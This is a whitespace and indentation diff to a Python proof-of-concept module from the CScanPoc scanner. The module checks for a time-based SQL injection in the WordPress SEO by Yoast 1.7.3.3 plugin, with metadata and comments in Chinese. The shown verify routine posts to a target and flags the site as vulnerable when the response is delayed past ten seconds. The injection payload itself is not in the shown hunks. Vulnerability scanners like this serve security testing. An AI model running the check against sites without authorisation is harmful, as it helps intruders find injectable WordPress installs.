@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'WordPress_0011'  # 平台漏洞编号，留空
     name = 'WordPress SEO by Yoast 1.7.3.3 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-03-12'  # 漏洞公布时间
     desc = '''
         该漏洞仅影响WordPress内部用户，因为该漏洞存在于admin/class-bulk-editor-list-table.php文件中，
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'WordPress SEO by Yoast 1.7.3.3'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'cba2363f-1e1a-41b1-912b-51a86362ec81'
@@ -40,14 +42,15 @@ class Poc(ABPoc):
             req = requests.post(verify_url)
 
             if time.time() - start > 10 and req.status_code == 200:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
